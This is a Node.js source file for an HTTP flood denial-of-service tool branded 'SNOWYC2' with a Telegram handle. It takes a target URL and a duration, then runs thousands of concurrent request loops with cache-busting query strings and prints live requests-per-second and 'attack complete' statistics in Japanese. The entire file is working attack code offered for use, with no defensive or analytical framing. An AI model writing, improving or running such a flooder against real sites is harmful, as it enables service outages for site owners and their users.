const axios = require('axios');
const os = require('os');
const process = require('process');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const MAX_CONCURRENT = Math.min(os.cpus().length * 200, 10000); // Push max concurrency higher
const REQUEST_TIMEOUT = 5000;  // Lower timeout for quicker response

// HTTP/1.1 and HTTP/2 support with keep-alive
const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0,
            h1Requests: 0,
            h2Requests: 0
        };
        this.running = true;
    }

    // Random user-agent generator without the extra array for speed
    getRandomUA() {
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
    }

    // Making requests with both HTTP/1.1 and HTTP/2
    async makeRequest() {
        const headers = {
            'User-Agent': this.getRandomUA(),
            'Connection': 'keep-alive'
        };

        const urlWithNoise = `${this.target}${this.target.includes('?') ? '&' : '?'}cb=${Math.random().toString(36).substring(2, 15)}`;

        try {
            const isHttps = this.target.startsWith('https');
            const isHttp2 = isHttps && this.target.includes('http2'); // Check if target is HTTP/2 supported

            const agent = isHttps ? keepAliveHttps : keepAliveHttp;
            const response = await axios.get(urlWithNoise, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent: agent,
                httpsAgent: agent,
                validateStatus: null
            });

            if (response.status === 200) {
                this.stats.success++;
                if (isHttp2) {
                    this.stats.h2Requests++;
                } else {
                    this.stats.h1Requests++;
                }
            } else {
                this.stats.errors++;
            }
        } catch {
            this.stats.errors++;
        }
        this.stats.total++;
    }

    async startWorkers() {
        const workers = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(this.workerLoop());
        }
        await Promise.all(workers);
    }

    async workerLoop() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            await this.makeRequest();
        }
    }

    async runAttack() {
        const showIntro = () => {
            console.clear();
            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
            console.log('  ============================================');
            console.log(`  TARGET: ${this.target}`);
            console.log(`  TIME:   ${this.duration / 1000}s`);
            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
            console.log('  ============================================\n');
        };

        showIntro();

        let lastTotal = 0;
        const printStats = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const currentRps = (this.stats.total - lastTotal) / 0.2;
            lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);

            // Japanese Attack Report
            const timeRemaining = Math.max(0, (this.duration - (Date.now() - this.startTime)) / 1000).toFixed(1);
            process.stdout.write(
                `\r  H2リクエスト: ${this.stats.h2Requests} | H1リクエスト: ${this.stats.h1Requests} | 残り時間: ${timeRemaining}s | ` +
                `送信済み: ${this.stats.total} | 200 OK: ${this.stats.success} | エラー: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
            );
        }, 200);

        await this.startWorkers();
        this.running = false;
        clearInterval(printStats);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  攻撃完了');
        console.log('  ============================================');
        console.log(`  時間:        ${elapsed.toFixed(1)}秒`);
        console.log(`  合計:        ${this.stats.total}`);
        console.log(`  成功:        ${this.stats.success}`);
        console.log(`  エラー:      ${this.stats.errors}`);
        console.log(`  平均RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  最大RPS:     ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

// Main
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("ターゲット: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("時間: ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("無効な時間入力です。");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("攻撃失敗:", err.message);
    }
})();
